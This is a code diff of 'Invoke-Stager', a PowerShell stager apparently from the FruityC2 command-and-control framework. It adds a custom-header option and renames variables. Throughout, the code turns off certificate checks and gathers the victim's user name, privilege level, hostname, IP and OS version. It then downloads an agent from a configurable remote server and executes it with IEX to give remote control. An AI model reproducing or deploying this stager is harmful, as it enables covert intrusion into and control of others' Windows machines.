@@ -19,16 +19,18 @@ function Invoke-Stager {
         $r_server = "",
         $r_port = "",
         $r_ssl = "",
-        $UA = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
-        $SID = "SESSIONID"
+        $UA = "FruityC2",
+        $SID = "SESSIONID",
+        $pg_header = ""
     )
 
     [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
-    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;
+    #[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;
+    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls;
 
-    [bool]$option_base64 = $false
-    [bool]$option_encryption = $false
-    [bool]$option_compression = $true
+    [bool]$o_base64 = $false
+    [bool]$o_encryption = $false
+    [bool]$o_compression = $true
       
     # getUUID
     #$string = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Cryptography' | Select-Object -ExpandProperty MachineGuid) | Out-String
@@ -36,30 +38,30 @@ function Invoke-Stager {
     $UUID = [int][double]::Parse((Get-Date -UFormat %s))
 
     # getUser
-    $string = ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name) | Out-String
-    $USER = $string.Trim()
+    $s = ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name) | Out-String
+    $USER = $s.Trim()
 
     # getMandatoryLabel
-    if(([Environment]::UserName).ToLower() -eq "system"){$string='4'}
-    elseif(([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator") -eq $true){$string='3'} # 3=High
-    else {$string='2'}
-    $LABEL = $string
+    if(([Environment]::UserName).ToLower() -eq "system"){$s='4'}
+    elseif(([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator") -eq $true){$s='3'} # 3=High
+    else {$s='2'}
+    $LABEL = $s
 
     # getComputerName
-    $string = (Get-WmiObject Win32_OperatingSystem).CSName | Out-String
-    $NAME = $string.Trim()
+    $s = (Get-WmiObject Win32_OperatingSystem).CSName | Out-String
+    $NAME = $s.Trim()
 
     # getComputerIP
-    $string = (Test-Connection $env:COMPUTERNAME -count 1 | select Ipv4Address) | FT -HideTableHeaders |  Out-String
-    $IP = $string.Trim()
+    $s = (Test-Connection $env:COMPUTERNAME -count 1 | select Ipv4Address) | FT -HideTableHeaders |  Out-String
+    $IP = $s.Trim()
 
     # getVersion
-    $string = (Get-WmiObject Win32_OperatingSystem).Name.split('|')[0] | Out-String
-    $VERSION = $string.Trim()
+    $s = (Get-WmiObject Win32_OperatingSystem).Name.split('|')[0] | Out-String
+    $VERSION = $s.Trim()
 
-    $string = (Get-WmiObject Win32_OperatingSystem).OSArchitecture  | Out-String
-    $string = $string.Trim()
-    $OS_ARCH = $string
+    $s = (Get-WmiObject Win32_OperatingSystem).OSArchitecture  | Out-String
+    $s = $s.Trim()
+    $OS_ARCH = $s
 
     function Get-Data {
         param($path = $script:path_get)
@@ -69,6 +71,18 @@ function Invoke-Stager {
             $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
             $wc.Headers.Add("User-Agent",$UA)
             $wc.Headers.Add("Cookie", "$SID=$TARGET;")
+            
+            if ($pg_header -ne "") {
+				$hs = $pg_header.split("|")
+				foreach ($h in $hs) {
+					$i = $h.split(" ")
+					if ($PSVersionTable.PSVersion.Major -eq 2 -And $i[0] -Eq "Host" ) {
+						#Write-Host "*** skip: $($i[0])" 
+					} else {
+						$wc.Headers.Add($i[0], $i[1])
+					}
+				}
+			}
 
             $request = "http$($r_ssl)://$($r_server):$($r_port)$($path)"
 
@@ -81,7 +95,8 @@ function Invoke-Stager {
         }
     }
 
-    function deflate($data) { # COMPRESS DATA
+    # COMPRESS DATA
+    function deflate($data) {
         # REF: https://gist.github.com/strazzere/5faa709a3db9e1dcf3b5
         # REF: http://chernodv.blogspot.co.uk/2014/12/powershell-compression-decompression.html
         $s = $data
@@ -97,7 +112,8 @@ function Invoke-Stager {
         return $s
     }
 
-    function inflate($data) { # DECOMPRESS DATA
+    # DECOMPRESS DATA
+    function inflate($data) {
         $data = $data.replace("-","+") # BASE64 URLSAFE
         $data = $data.replace("_","/") # BASE64 URLSAFE
         $data = [System.Convert]::FromBase64String($data)
@@ -110,16 +126,16 @@ function Invoke-Stager {
     }
 
     Function rx_data($data) {
-        #if ($option_base64 -eq $true) { $data = b64decoder($data) }
-        if ($option_compression -eq $true) { $data = inflate($data) }
-        if ($option_encryption -eq $true) { $data = decrypt($data) }
+        #if ($o_base64 -eq $true) { $data = b64decoder($data) }
+        if ($o_compression -eq $true) { $data = inflate($data) }
+        if ($o_encryption -eq $true) { $data = decrypt($data) }
         return $data
     }
 
     Function tx_data($data) {
-        if ($option_encryption -eq $true) { $data = encrypt($data) }
-        if ($option_compression -eq $true) { $data = deflate($data) }
-        #if ($option_base64 -eq $true) { $data = b64encoder($data) }
+        if ($o_encryption -eq $true) { $data = encrypt($data) }
+        if ($o_compression -eq $true) { $data = deflate($data) }
+        #if ($o_base64 -eq $true) { $data = b64encoder($data) }
         return $data
     }
 
@@ -130,7 +146,8 @@ function Invoke-Stager {
 
         Write-Host "STAGER: $data"
 
-        [String]$data = rx_data($data) # DECODE/DECRYPT RECEIVED DATA
+        # DECODE/DECRYPT RECEIVED DATA
+        [String]$data = rx_data($data) 
     
         [Array[]]$temp = $data.split("|")
 
@@ -147,7 +164,7 @@ function Invoke-Stager {
         Write-Host $agent
 
         IEX $($agent)
-        Invoke-FruityC2 -path_get $path_get -path_post $path_post -jitter $jitter -stime $stime -UA $UA -stager $false -r_server $r_server -r_port $r_port -target $TARGET -post_id $post_id -session_id $session_id -r_ssl $r_ssl
+        Invoke-FruityC2 -path_get $path_get -path_post $path_post -jitter $jitter -stime $stime -UA $UA -stager $false -r_server $r_server -r_port $r_port -target $TARGET -post_id $post_id -session_id $session_id -r_ssl $r_ssl -pg_header $pg_header
 
     }
 
@@ -164,4 +181,4 @@ function Invoke-Stager {
 
 }
 clear
-Invoke-Stager -r_server "**domain**" -r_port "**port**" -UA "**useragent**" -r_ssl "**ssl**"
+Invoke-Stager -r_server "**domain**" -r_port "**port**" -UA "**useragent**" -r_ssl "**ssl**" -pg_header "**pg_header**"
